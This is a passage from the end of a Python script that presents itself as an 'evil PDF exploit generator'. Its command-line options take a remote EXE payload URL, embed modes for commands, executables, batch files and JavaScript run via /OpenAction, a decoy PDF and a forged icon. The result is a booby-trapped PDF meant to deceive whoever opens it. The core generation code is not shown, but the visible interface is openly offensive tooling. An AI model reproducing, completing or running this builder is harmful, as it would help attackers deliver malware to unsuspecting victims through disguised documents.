                print(f"  {C.GREEN}{C.BOLD}►{C.RESET} {label:<15}: "
                      f"{C.CYAN}{value}{C.RESET}")
            row("Payload URL", self.exe_url)
            row("EXE auto-name", self.auto_exe_name)
            row("Custom text", self.custom_text)
            row("Decoy PDF", self.decoy_pdf)
            row("Embedded file", self.embed_name)
            row("Icon applied", self.icon_applied)
            row("Output file", self.output_file)
            row("File size", f"{size:,} bytes")

            return True
        except Exception as e:
            print(f"  {C.RED}[✗] Error generating PDF: {e}{C.RESET}")
            return False

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="EXE ➜ evil PDF exploit generator (v4.2)")
    parser.add_argument("exe_url", help="URL of the EXE to embed")
    parser.add_argument("pdf_name", help="Name of the output PDF file")
    parser.add_argument("--save-path", default=".", help="Directory to save the PDF (default: current dir)")
    parser.add_argument("--embed", choices=["cmd", "exe", "url", "batch", "js"], default="cmd", help="Embed mode (default: cmd)")
    parser.add_argument("--decoy-pdf", help="Path to a decoy PDF file")
    parser.add_argument("--custom-text", help="Custom text to show on the page (up to 1000 chars)")
    parser.add_argument("--alias", help="Alias for the embedded file name")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    parser.add_argument("--icon", help="Path to the icon file to stamp into the EXE")
    parser.add_argument("--batch-file", help="Path to a batch file to embed")
    parser.add_argument("--js-file", help="Path to a JavaScript file for /OpenAction")
    args = parser.parse_args()

    evilpdf = EvilPDF(args.exe_url, args.pdf_name, args.save_path, args.embed,
                     args.decoy_pdf, args.custom_text, args.alias, args.debug,
                     args.icon, args.batch_file, args.js_file)

    if evilpdf.validate() and evilpdf.generate():
        print(f"  {C.GREEN}[✓] PDF generated successfully!{C.RESET}")
    else:
        print(f"  {C.RED}[✗] PDF generation failed.{C.RESET}")
